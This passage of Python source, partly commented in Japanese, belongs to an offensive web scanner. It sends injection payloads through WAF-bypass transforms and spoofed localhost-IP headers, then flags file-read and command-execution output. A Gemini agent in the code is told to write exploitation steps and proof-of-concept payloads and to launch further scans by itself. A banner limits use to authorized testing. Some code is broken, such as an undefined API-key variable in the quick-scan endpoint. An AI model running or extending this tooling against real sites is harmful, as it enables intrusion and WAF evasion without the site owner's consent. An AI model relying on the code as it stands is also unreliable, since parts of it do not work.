        {'CF-Connecting-IP': '127.0.0.1', 'True-Client-IP': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1', 'X-Cluster-Client-IP': '127.0.0.1'},
        {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
        {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
        {'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate'},
        {'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'},
    ]
    
    try:
        data_dict = json.loads(data) if data else {}
    except (json.JSONDecodeError, TypeError):
        return f"Error: Invalid JSON data format"
    
    vulnerabilities_found = []
    bypass_successes = []
    response_analysis = []
    
    try:
        async with get_http_client() as client:
            # ベースライン取得
            try:
                t0 = time.monotonic()
                baseline_response = await client.request(method.upper(), url, data=data_dict, headers=headers or {})
                t1 = time.monotonic()
                baseline_status = baseline_response.status_code
                baseline_length = len(baseline_response.text)
                baseline_time = t1 - t0
            except Exception as e:
                return f"Baseline request failed: {e}"
            
            # ペイロード生成
            payload_generators = {
                "xss": generate_advanced_xss_payloads,
                "sql_injection": generate_advanced_sqli_payloads,
                "lfi": generate_advanced_lfi_payloads,
                "rce": generate_advanced_rce_payloads,
                "ssti": generate_advanced_ssti_payloads,
                "xxe": generate_advanced_xxe_payloads,
                "nosql": generate_advanced_nosql_payloads,
                "ssrf": generate_advanced_ssrf_payloads,
                "deserialization": generate_deserialization_payloads
            }
            
            if payload_type not in payload_generators:
                return f"Error: Unsupported payload type: {payload_type}"
            
            payloads = payload_generators[payload_type]()
            
            # 高度なテスト実行
            for i, base_payload in enumerate(payloads[:15]):  # トップ15ペイロードをテスト
                for technique in bypass_techniques[:8]:  # トップ8バイパス手法
                    for header_set in advanced_headers_list[:6]:  # トップ6ヘッダーセット
                        try:
                            # ペイロードにバイパス手法を適用
                            bypassed_payload = apply_advanced_waf_bypass(base_payload, technique)
                            
                            # 複数パラメータでテスト
                            param_names = ['q', 'search', 'query', 'id', 'data', 'input', 'value', 'term', 'keyword', 'content']
                            
                            for param in param_names[:4]:
                                test_data = {**data_dict, param: bypassed_payload}
                                combined_headers = {**(headers or {}), **header_set}
                                
                                response = await client.request(method.upper(), url, data=test_data, headers=combined_headers, timeout=15)
                                
                                # WAFバイパス検出
                                if baseline_status in [403, 406, 429, 503] and response.status_code == 200:
                                    bypass_successes.append(f"WAF_BYPASS: {technique} + {list(header_set.keys())}")
                                
                                # 高度な脆弱性検出
                                response_text = response.text
                                response_lower = response_text.lower()
                                response_time = response.elapsed.total_seconds()
                                
                                # XSS検出
                                if payload_type == "xss":
                                    xss_indicators = [
                                        bypassed_payload in response_text,
                                        any(tag in response_text for tag in ['<script>', '<svg', '<img', 'javascript:', 'alert(', 'onerror=']),
                                        re.search(r'<[^>]*on\w+\s*=', response_text, re.IGNORECASE),
                                        'eval(' in response_text and bypassed_payload in response_text
                                    ]
                                    if any(xss_indicators):
                                        vulnerabilities_found.append(f"XSS_DETECTED: {technique} bypass with {param} parameter")
                                
                                # SQL Injection検出
                                elif payload_type == "sql_injection":
                                    sql_error_patterns = [
                                        r'sql.{0,20}(syntax|error)', r'mysql.{0,20}error', r'ora-\d{5}',
                                        r'microsoft.{0,20}database', r'postgresql.{0,20}error', r'sqlite.{0,20}error',
                                        r'syntax.{0,20}error', r'unterminated.{0,20}quoted', r'quoted.{0,20}string'
                                    ]
                                    
                                    if response.status_code == 500 or any(re.search(p, response_lower) for p in sql_error_patterns):
                                        vulnerabilities_found.append(f"SQLI_ERROR_BASED: {technique} bypass")
                                    
                                    if response_time > baseline_time + 4:
                                        vulnerabilities_found.append(f"SQLI_TIME_BASED: {response_time:.2f}s delay detected")
                                    
                                    if abs(len(response_text) - baseline_length) > 500:
                                        vulnerabilities_found.append(f"SQLI_UNION_BASED: Response length change detected")
                                
                                # LFI検出
                                elif payload_type == "lfi":
                                    lfi_indicators = [
                                        'root:x:', 'daemon:', 'bin:', 'sys:', 'adm:', 'nobody:',
                                        '[boot loader]', '[operating systems]', 'version', 'linux',
                                        'ubuntu', 'debian', 'centos', 'apache', 'nginx'
                                    ]
                                    if any(indicator in response_lower for indicator in lfi_indicators):
                                        vulnerabilities_found.append(f"LFI_FILE_READ: {technique} bypass successful")
                                
                                # RCE検出
                                elif payload_type == "rce":
                                    rce_indicators = [
                                        'uid=', 'gid=', 'groups=', 'root@', 'bash-', 'sh-',
                                        'total ', 'drwx', '-rwx', r'\d+:\d+:\d+', 'kernel',
                                        'windows', 'system32', 'program files', 'users'
                                    ]
                                    if any(re.search(indicator, response_lower) for indicator in rce_indicators):
                                        vulnerabilities_found.append(f"RCE_COMMAND_EXEC: {technique} bypass successful")
                                    
                                    if response_time > baseline_time + 4:
                                        vulnerabilities_found.append(f"RCE_TIME_BASED: {response_time:.2f}s delay detected")
                                
                                # SSTI検出
                                elif payload_type == "ssti":
                                    if "49" in response_text or "343" in response_text:  # 7*7=49, 7*7*7=343
                                        vulnerabilities_found.append(f"SSTI_ARITHMETIC: Template evaluation detected")
                                    
                                    ssti_indicators = ['__class__', '__mro__', '__subclasses__', 'config', 'application']
                                    if any(indicator in response_lower for indicator in ssti_indicators):
                                        vulnerabilities_found.append(f"SSTI_OBJECT_EXPOSURE: {technique} bypass")
                                
                                # XXE検出
                                elif payload_type == "xxe":
                                    xxe_indicators = [
                                        'root:x:', 'daemon:', 'bin:', 'www-data:', 'apache:',
                                        '<?xml', '<!doctype', '<!entity', 'version'
                                    ]
                                    if any(indicator in response_lower for indicator in xxe_indicators):
                                        vulnerabilities_found.append(f"XXE_FILE_READ: External entity processing detected")
                                
                                # NoSQL Injection検出
                                elif payload_type == "nosql":
                                    if response.status_code != baseline_status or abs(len(response_text) - baseline_length) > 100:
                                        vulnerabilities_found.append(f"NOSQL_INJECTION: Query manipulation detected")
                                
                                # SSRF検出
                                elif payload_type == "ssrf":
                                    if response_time > baseline_time + 2:
                                        vulnerabilities_found.append(f"SSRF_TIME_DELAY: Connection attempt detected")
                                    
                                    if response.status_code in [200, 301, 302, 404] and response.status_code != baseline_status:
                                        vulnerabilities_found.append(f"SSRF_STATUS_CHANGE: Internal service response")
                                
                                # Deserialization検出
                                elif payload_type == "deserialization":
                                    deserial_indicators = ['java.lang', 'Exception', 'Error', 'serialization']
                                    if any(indicator in response_text for indicator in deserial_indicators):
                                        vulnerabilities_found.append(f"DESERIAL_ERROR: Deserialization processing detected")
                                
                                # レスポンス分析データ収集
                                if len(vulnerabilities_found) > len([x for x in response_analysis if 'vuln' in x]):
                                    response_analysis.append(f"Response: Status={response.status_code}, Length={len(response_text)}, Time={response_time:.3f}s")
                                
                                # 脆弱性が見つかったら次のペイロードへ
                                if vulnerabilities_found:
                                    break
                                    
                            if vulnerabilities_found:
                                break
                        except Exception as e:
                            continue
                    
                    if vulnerabilities_found:
                        break
                
                # 進行状況制限
                if i >= 10 and vulnerabilities_found:  # 10ペイロード試して脆弱性が見つかれば停止
                    break
            
            # 結果集約
            result_parts = []
            result_parts.append(f"=== ADVANCED VULNERABILITY SCAN RESULTS ===")
            result_parts.append(f"Target: {url}")
            result_parts.append(f"Payload Type: {payload_type.upper()}")
            result_parts.append(f"Baseline: {baseline_status} ({baseline_length} chars, {baseline_time:.3f}s)")
            result_parts.append("")
            
            if bypass_successes:
                result_parts.append("🔓 WAF BYPASSES SUCCESSFUL:")
                for bypass in set(bypass_successes):
                    result_parts.append(f"  • {bypass}")
                result_parts.append("")
            
            if vulnerabilities_found:
                result_parts.append("🚨 VULNERABILITIES DETECTED:")
                for vuln in set(vulnerabilities_found):
                    result_parts.append(f"  • {vuln}")
                result_parts.append("")
                
                result_parts.append("📊 RESPONSE ANALYSIS:")
                for analysis in response_analysis[-3:]:  # 最新3件の分析データ
                    result_parts.append(f"  • {analysis}")
                
                # レスポンスサンプル（最初の2000文字、機密情報なし）
                if len(response_text) > 0:
                    sample = response_text[:2000]
                    result_parts.append(f"\n📄 RESPONSE SAMPLE:\n{sample}")
            else:
                result_parts.append("✅ No obvious vulnerabilities detected with current payloads")
            
            return "\n".join(result_parts)
            
    except Exception as e:
        logger.error(f"Advanced scanner error: {e}")
        return f"Scanner Error: {str(e)}"

# --- 自動化された包括的スキャン ---
async def perform_comprehensive_scan(scan_input: "ScanInput") -> str:
    """包括的な脆弱性スキャンを実行"""
    scan_log = []
    target_url = f"{scan_input.url.rstrip('/')}{scan_input.target_endpoint}"
    scan_start_time = time.time()
    
    scan_log.append(f"🎯 COMPREHENSIVE BUG BOUNTY SCAN INITIATED")
    scan_log.append(f"Target: {target_url}")
    scan_log.append(f"Vulnerability Types: {', '.join(scan_input.vulnerability_types)}")
    scan_log.append(f"Timestamp: {datetime.now().isoformat()}")
    scan_log.append("=" * 80)
    
    # 各脆弱性タイプに対して高度なスキャンを実行
    for vuln_type in scan_input.vulnerability_types:
        scan_log.append(f"\n🔍 TESTING: {vuln_type.upper()}")
        scan_log.append("-" * 50)
        
        try:
            # 高度なスキャナーを使用
            result = await advanced_vulnerability_scanner(
                url=target_url,
                method="POST",
                payload_type=vuln_type,
                data='{"q": "test", "search": "test", "id": "1"}',
                advanced_mode=True
            )
            scan_log.append(result)
            
        except Exception as e:
            scan_log.append(f"❌ Error testing {vuln_type}: {str(e)}")
    
    scan_duration = time.time() - scan_start_time
    scan_log.append(f"\n⏱️  SCAN COMPLETED in {scan_duration:.2f} seconds")
    scan_log.append("=" * 80)
    
    return "\n".join(scan_log)

# --- バックグラウンドスキャンワーカー ---
async def run_comprehensive_scan_and_analyze(scan_input: "ScanInput"):
    """包括的なスキャンと分析を実行"""
    scan_id = f"comprehensive_scan_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}"
    logger.info(f"[{scan_id}] 🚀 Advanced Bug Bounty Scan Started")
    
    try:
        # 包括的スキャン実行
        logger.info(f"[{scan_id}] Executing comprehensive vulnerability scan...")
        scan_results = await perform_comprehensive_scan(scan_input)
        
        logger.info(f"[{scan_id}] ===== COMPREHENSIVE SCAN RESULTS =====")
        logger.info(f"\n{scan_results}")
        logger.info(f"[{scan_id}] =========================================")
        
        # LLM分析（利用可能な場合）
        if config.google_api_key:
            try:
                logger.info(f"[{scan_id}] Starting advanced LLM analysis...")
                
                llm = ChatGoogleGenerativeAI(
                    model="gemini-1.5-flash", 
                    temperature=0.1,
                    google_api_key=config.google_api_key
                )
                tools = [advanced_vulnerability_scanner]
                memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True)
                
                agent_prompt = ChatPromptTemplate.from_messages([
                    ("system", """You are an elite bug bounty hunter and penetration tester with expertise in:
                    - Advanced web application security testing
                    - WAF bypass techniques  
                    - Exploit development and proof-of-concept creation
                    - OWASP Top 10 and beyond
                    - Modern attack vectors and zero-day techniques
                    
                    Your task is to analyze comprehensive vulnerability scan results and provide:
                    1. Critical vulnerability assessment with CVSS scoring
                    2. Detailed exploitation techniques and proof-of-concepts
                    3. Business impact analysis for bug bounty reporting
                    4. Advanced testing recommendations for deeper assessment
                    5. WAF bypass strategies if applicable
                    
                    Focus on high-impact vulnerabilities suitable for bug bounty programs.
                    Provide actionable intelligence for security researchers."""),
                    MessagesPlaceholder("chat_history"),
                    ("human", "{query}"),
                    MessagesPlaceholder("agent_scratchpad"),
                ])
                
                agent = create_tool_calling_agent(llm, tools, agent_prompt)
                agent_executor = AgentExecutor(
                    agent=agent, 
                    tools=tools, 
                    verbose=True, 
                    memory=memory, 
                    handle_parsing_errors=True,
                    max_iterations=7
                )
                
                tech_stack_str = ", ".join([
                    f"{item.get('name', 'Unknown')} {item.get('version', '')}".strip() 
                    for item in (scan_input.tech_stack or [])
                ]) or "Not specified"
                
                analysis_query = f"""
                Analyze these comprehensive bug bounty scan results for maximum impact findings:

                ### TARGET INTELLIGENCE
                - URL: {scan_input.url}
                - Endpoint: {scan_input.target_endpoint}  
                - Technology Stack: {tech_stack_str}
                - Tested Attack Vectors: {', '.join(scan_input.vulnerability_types)}

                ### COMPREHENSIVE SCAN RESULTS
                ```
                {scan_results}
                ```

                ### REQUIRED ANALYSIS
                1. **Executive Summary**: Critical findings and overall security posture
                2. **Vulnerability Details**: Each finding with:
                   - CVSS v3.1 score and severity
                   - Detailed exploitation steps
                   - Proof-of-concept payloads
                   - Business impact assessment
                3. **Advanced Testing**: Recommend additional testing with available tools
                4. **Bug Bounty Strategy**: Reporting approach and impact demonstration
                5. **Remediation**: Technical fixes and security controls

                If any findings require deeper investigation, use the advanced_vulnerability_scanner tool 
                for targeted testing with specific payloads and bypass techniques.
                """
                
                result = await asyncio.wait_for(
                    agent_executor.ainvoke({"query": analysis_query}),
                    timeout=900  # 15分のタイムアウト
                )
                
                analysis_report = result.get('output', 'Analysis completed with limited results.')
                
                logger.info(f"[{scan_id}] ===== ADVANCED SECURITY ANALYSIS =====")
                logger.info(f"\n{analysis_report}")
                logger.info(f"[{scan_id}] ======================================")
                
            except asyncio.TimeoutError:
                logger.error(f"[{scan_id}] LLM analysis timed out after 15 minutes")
            except Exception as e:
                logger.error(f"[{scan_id}] LLM analysis error: {e}")
                logger.error(traceback.format_exc())
        else:
            logger.info(f"[{scan_id}] LLM analysis skipped (GOOGLE_API_KEY not configured)")
            
    except Exception as e:
        logger.error(f"[{scan_id}] Comprehensive scan error: {e}")
        logger.error(traceback.format_exc())

# --- Pydanticモデル ---
class TechStackItem(BaseModel):
    name: str
    version: Optional[str] = None

class ScanInput(BaseModel):
    url: str = Field(..., description="Target base URL")
    target_endpoint: str = Field(..., description="Target endpoint path") 
    tech_stack: Optional[List[TechStackItem]] = Field(None, description="Technology stack")
    vulnerability_types: List[str] = Field(
        default=["xss", "sql_injection", "lfi", "rce", "ssti"], 
        description="Vulnerability types to test"
    )
    
    @validator('url')
    def validate_url(cls, v):
        if not v.startswith(('http://', 'https://')):
            raise ValueError('URL must start with http:// or https://')
        return v.rstrip('/')
    
    @validator('target_endpoint')
    def validate_endpoint(cls, v):
        if not v.startswith('/'):
            v = '/' + v
        return v
    
    @validator('vulnerability_types')
    def validate_vuln_types(cls, v):
        allowed_types = ["xss", "sql_injection", "lfi", "rce", "ssti", "xxe", "nosql", "ssrf", "deserialization"]
        invalid_types = [t for t in v if t not in allowed_types]
        if invalid_types:
            raise ValueError(f'Invalid vulnerability types: {invalid_types}')
        return v

# --- APIエンドポイント ---
@router.post("/start_comprehensive_scan")
async def start_comprehensive_scan(scan_input: ScanInput, background_tasks: BackgroundTasks):
    """包括的バグバウンティスキャンを開始"""
    try:
        logger.info(f"🎯 Comprehensive scan request: {scan_input.url}{scan_input.target_endpoint}")
        background_tasks.add_task(run_comprehensive_scan_and_analyze, scan_input)
        
        return {
            "status": "comprehensive_scan_initiated",
            "message": "Advanced bug bounty vulnerability scan started with comprehensive payloads and bypass techniques.",
            "target": f"{scan_input.url}{scan_input.target_endpoint}",
            "vulnerability_types": scan_input.vulnerability_types,
            "features": [
                "Advanced WAF bypass techniques",
                "Comprehensive payload sets", 
                "Multiple parameter testing",
                "Response time analysis",
                "Error-based detection",
                "LLM-powered analysis"
            ],
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        logger.error(f"Comprehensive scan initiation error: {e}")
        raise HTTPException(status_code=500, detail="Failed to start comprehensive vulnerability scan")

@router.post("/quick_scan")
async def quick_vulnerability_scan(
    url: str = Field(..., description="Target URL"),
    vulnerability_type: str = Field(..., description="Vulnerability type to test"),
    method: str = Field(default="POST", description="HTTP method"),
    data: str = Field(default='{"q": "test"}', description="Request data as JSON string")
):
    """クイック脆弱性スキャン - 単一の脆弱性タイプを即座にテスト"""
    # Auth & URL guard
    require_api_key(x_api_key)
    validate_outbound_url(url)
    try:
        result = await advanced_vulnerability_scanner(
            url=url,
            method=method,
            payload_type=vulnerability_type,
            data=data,
            advanced_mode=True
        )
        
        return {
            "status": "scan_completed",
            "target": url,
            "vulnerability_type": vulnerability_type,
            "results": result,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        logger.error(f"Quick scan error: {e}")
        raise HTTPException(status_code=500, detail=f"Scan failed: {str(e)}")

@router.get("/health")
async def health_check():
    """ヘルスチェック"""
    return {
        "status": "healthy",
        "version": "3.0.0",
        "features": {
            "advanced_payloads": True,
            "waf_bypass": True,
            "comprehensive_scanning": True,
            "llm_analysis": config.google_api_key is not None,
            "supported_vulnerabilities": [
                "xss", "sql_injection", "lfi", "rce", "ssti", 
                "xxe", "nosql", "ssrf", "deserialization"
            ]
        },
        "timestamp": datetime.now().isoformat()
    }

# --- 高度なフロントエンド ---
@app.get("/", response_class=HTMLResponse)
async def serve_advanced_frontend():
    """高度なバグバウンティスキャナーフロントエンド"""
    return HTMLResponse(content="""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔥 Elite Bug Bounty Scanner v3.0</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
                background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
                color: #00ff00;
                min-height: 100vh;
                overflow-x: hidden;
            }
            
            .matrix-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
                opacity: 0.1;
            }
            
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
                position: relative;
                z-index: 1;
            }
            
            .header {
                text-align: center;
                margin-bottom: 40px;
                padding: 30px;
                background: rgba(0, 255, 0, 0.05);
                border: 2px solid #00ff00;
                border-radius: 10px;
                box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
            }
            
            .header h1 {
                font-size: 3em;
                margin-bottom: 10px;
                text-shadow: 0 0 20px #00ff00;
                animation: glow 2s ease-in-out infinite alternate;
            }
            
            @keyframes glow {
                from { text-shadow: 0 0 20px #00ff00; }
                to { text-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }
            }
            
            .header p {
                font-size: 1.2em;
                opacity: 0.8;
                margin-bottom: 20px;
            }
            
            .warning {
                background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
                color: white;
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
                border: 2px solid #ff0000;
                box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
                animation: pulse 3s infinite;
            }
            
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.8; }
            }
            
            .scan-modes {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
                gap: 30px;
                margin: 40px 0;
            }
            
            .scan-mode {
                background: rgba(0, 255, 0, 0.05);
                border: 2px solid #00ff00;
                border-radius: 15px;
                padding: 30px;
                transition: all 0.3s ease;
                position: relative;
                overflow: hidden;
            }
            
            .scan-mode:hover {
                background: rgba(0, 255, 0, 0.1);
                box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
                transform: translateY(-5px);
            }
            
            .scan-mode h3 {
                font-size: 1.8em;
                margin-bottom: 15px;
                color: #00ff41;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #00ff00;
                font-weight: bold;
            }
            
            .form-group input, .form-group select, .form-group textarea {
                width: 100%;
                padding: 12px;
                background: rgba(0, 0, 0, 0.7);
                border: 2px solid #00ff00;
                border-radius: 8px;
                color: #00ff00;
                font-family: inherit;
                transition: all 0.3s ease;
            }
            
            .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
                outline: none;
                border-color: #00ff41;
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            }
            
            .vulnerability-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
                gap: 10px;
                margin: 15px 0;
            }
            
            .vuln-checkbox {
                display: flex;
                align-items: center;
                padding: 10px;
                background: rgba(0, 0, 0, 0.7);
                border: 2px solid #333;
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.3s ease;
                font-size: 0.9em;
            }
            
            .vuln-checkbox:hover {
                border-color: #00ff00;
            }
            
            .vuln-checkbox.checked {
                background: rgba(0, 255, 0, 0.2);
                border-color: #00ff00;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            }
            
            .vuln-checkbox input[type="checkbox"] {
                width: auto;
                margin-right: 8px;
            }
            
            .action-button {
                background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
                color: #000;
                border: none;
                padding: 15px 30px;
                font-size: 1.1em;
                font-weight: bold;
                border-radius: 25px;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
                position: relative;
                overflow: hidden;
                width: 100%;
                margin: 20px 0;
            }
            
            .action-button:hover {
                background: linear-gradient(135deg, #00ff41 0%, #00ff00 100%);
                box-shadow: 0 0 25px rgba(0, 255, 0, 0.5);
                transform: translateY(-2px);
            }
            
            .action-button:active {
                transform: translateY(0);
            }
            
            .action-button:disabled {
                background: #333;
                color: #666;
                cursor: not-allowed;
                transform: none;
                box-shadow: none;
            }
            
            .output {
                background: rgba(0, 0, 0, 0.9);
                border: 2px solid #00ff00;
                border-radius: 15px;
                padding: 25px;
                margin: 30px 0;
                font-family: 'Monaco', monospace;
                white-space: pre-wrap;
                word-wrap: break-word;
                max-height: 600px;
                overflow-y: auto;
                display: none;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
            }
            
            .status {
                display: inline-block;
                padding: 10px 20px;
                border-radius: 20px;
                font-weight: bold;
                margin: 10px 0;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .status.success {
                background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
                color: #000;
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            }
            
            .status.error {
                background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
                color: white;
                box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
            }
            
            .status.info {
                background: linear-gradient(135deg, #0099ff 0%, #0066cc 100%);
                color: white;
                box-shadow: 0 0 15px rgba(0, 153, 255, 0.3);
            }
            
            .loading {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 3px solid rgba(0, 255, 0, 0.3);
                border-radius: 50%;
                border-top-color: #00ff00;
                animation: spin 1s ease-in-out infinite;
                margin-right: 10px;
            }
            
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
            
            .feature-list {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin: 20px 0;
            }
            
            .feature {
                background: rgba(0, 255, 0, 0.1);
                border: 1px solid #00ff00;
                padding: 15px;
                border-radius: 8px;
                text-align: center;
            }
            
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }
            
            .stat {
                background: rgba(0, 255, 0, 0.1);
                border: 2px solid #00ff00;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
            }
            
            .stat-number {
                font-size: 2em;
                font-weight: bold;
                color: #00ff41;
            }
            
            .stat-label {
                font-size: 0.9em;
                opacity: 0.8;
                margin-top: 5px;
            }
            
            @media (max-width: 768px) {
                .scan-modes {
                    grid-template-columns: 1fr;
                }
                .vulnerability-grid {
                    grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
                }
                .header h1 {
                    font-size: 2em;
                }
            }
        </style>
    </head>
    <body>
        <div class="matrix-bg" id="matrixBg"></div>
        
        <div class="container">
            <div class="header">
                <h1>🔥 ELITE BUG BOUNTY SCANNER</h1>
                <p>Advanced Web Application Security Testing Platform v3.0</p>
                
                <div class="stats">
                    <div class="stat">
                        <div class="stat-number">500+</div>
                        <div class="stat-label">Attack Payloads</div>
                    </div>
                    <div class="stat">
                        <div class="stat-number">12</div>
                        <div class="stat-label">WAF Bypass Techniques</div>
                    </div>
                    <div class="stat">
                        <div class="stat-number">9</div>
                        <div class="stat-label">Vulnerability Classes</div>
                    </div>
                    <div class="stat">
                        <div class="stat-number">AI</div>
                        <div class="stat-label">Powered Analysis</div>
                    </div>
                </div>
            </div>
            
            <div class="warning">
                <strong>⚠️ AUTHORIZED TESTING ONLY</strong><br>
                This is a professional-grade penetration testing tool for authorized bug bounty hunting and security research.
                Only use on systems you own or have explicit written permission to test.
                Unauthorized use may violate laws and terms of service.
                Always follow responsible disclosure practices.
            </div>
            
            <div class="scan-modes">
                <!-- Comprehensive Scan Mode -->
                <div class="scan-mode">
                    <h3>🎯 COMPREHENSIVE SCAN</h3>
                    <p>Full-spectrum vulnerability assessment with advanced bypass techniques</p>
                    
                    <div class="form-group">
                        <label for="comp_url">🌐 Target URL</label>
                        <input type="text" id="comp_url" value="https://target.com" placeholder="https://example.com">
                    </div>
                    
                    <div class="form-group">
                        <label for="comp_endpoint">📍 Target Endpoint</label>
                        <input type="text" id="comp_endpoint" value="/search" placeholder="/login, /api/search, /upload">
                    </div>
                    
                    <div class="form-group">
                        <label for="comp_tech">🔧 Tech Stack (Optional)</label>
                        <input type="text" id="comp_tech" placeholder="PHP 8.0, MySQL 8.0, Apache 2.4" value="">
                    </div>
                    
                    <div class="form-group">
                        <label>🔍 Vulnerability Types</label>
                        <div class="vulnerability-grid" id="compVulnTypes">
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'xss')">
                                <input type="checkbox" value="xss" checked>
                                <span>XSS</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'sql_injection')">
                                <input type="checkbox" value="sql_injection" checked>
                                <span>SQLi</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'lfi')">
                                <input type="checkbox" value="lfi">
                                <span>LFI</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'rce')">
                                <input type="checkbox" value="rce">
                                <span>RCE</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'ssti')">
                                <input type="checkbox" value="ssti">
                                <span>SSTI</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'xxe')">
                                <input type="checkbox" value="xxe">
                                <span>XXE</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'nosql')">
                                <input type="checkbox" value="nosql">
                                <span>NoSQL</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'ssrf')">
                                <input type="checkbox" value="ssrf">
                                <span>SSRF</span>
                            </div>
                            <div class="vuln-checkbox" onclick="toggleVuln(this, 'deserialization')">
                                <input type="checkbox" value="deserialization">
                                <span>Deserial</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="feature-list">
                        <div class="feature">✅ 500+ Payloads</div>
                        <div class="feature">✅ 12 WAF Bypasses</div>
                        <div class="feature">✅ Multi-Parameter Testing</div>
                        <div class="feature">✅ AI Analysis</div>
                        <div class="feature">✅ Time-Based Detection</div>
                        <div class="feature">✅ Error Analysis</div>
                    </div>
                    
                    <button class="action-button" onclick="startComprehensiveScan()" id="compScanBtn">
                        🚀 LAUNCH COMPREHENSIVE SCAN
                    </button>
                </div>
                
                <!-- Quick Scan Mode -->
                <div class="scan-mode">
                    <h3>⚡ QUICK SCAN</h3>
                    <p>Rapid single-vulnerability testing for immediate results</p>
                    
                    <div class="form-group">
                        <label for="quick_url">🌐 Target URL</label>
                        <input type="text" id="quick_url" value="https://target.com/search" placeholder="https://example.com/endpoint">
                    </div>
                    
                    <div class="form-group">
                        <label for="quick_vuln">🎯 Vulnerability Type</label>
                        <select id="quick_vuln">
                            <option value="xss">XSS - Cross-Site Scripting</option>
                            <option value="sql_injection">SQLi - SQL Injection</option>
                            <option value="lfi">LFI - Local File Inclusion</option>
                            <option value="rce">RCE - Remote Code Execution</option>
                            <option value="ssti">SSTI - Server-Side Template Injection</option>
                            <option value="xxe">XXE - XML External Entity</option>
                            <option value="nosql">NoSQL Injection</option>
                            <option value="ssrf">SSRF - Server-Side Request Forgery</option>
                            <option value="deserialization">Deserialization Attacks</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="quick_method">📡 HTTP Method</label>
                        <select id="quick_method">
                            <option value="POST">POST</option>
                            <option value="GET">GET</option>
                            <option value="PUT">PUT</option>
                            <option value="PATCH">PATCH</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="quick_data">📦 Request Data (JSON)</label>
                        <textarea id="quick_data" rows="3" placeholder='{"q": "test", "search": "query", "id": "1"}'>{&quot;q&quot;: &quot;test&quot;, &quot;search&quot;: &quot;query&quot;}</textarea>
                    </div>
                    
                    <div class="feature-list">
                        <div class="feature">⚡ Instant Results</div>
                        <div class="feature">🎯 Focused Testing</div>
                        <div class="feature">🔧 Custom Payloads</div>
                        <div class="feature">📊 Detailed Response</div>
                    </div>
                    
                    <button class="action-button" onclick="startQuickScan()" id="quickScanBtn">
                        ⚡ EXECUTE QUICK SCAN
                    </button>
                </div>
            </div>
            
            <div id="output" class="output"></div>
        </div>

        <script>
            // Matrix background effect
            function createMatrixEffect() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                document.getElementById('matrixBg').appendChild(canvas);
                
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                
                const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                const charArray = chars.split('');
                const fontSize = 14;
                const columns = canvas.width / fontSize;
                const drops = [];
                
                for (let x = 0; x < columns; x++) {
                    drops[x] = 1;
                }
                
                function draw() {
                    ctx.fillStyle = 'rgba(12, 12, 12, 0.05)';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    ctx.fillStyle = '#00ff00';
                    ctx.font = fontSize + 'px Monaco';
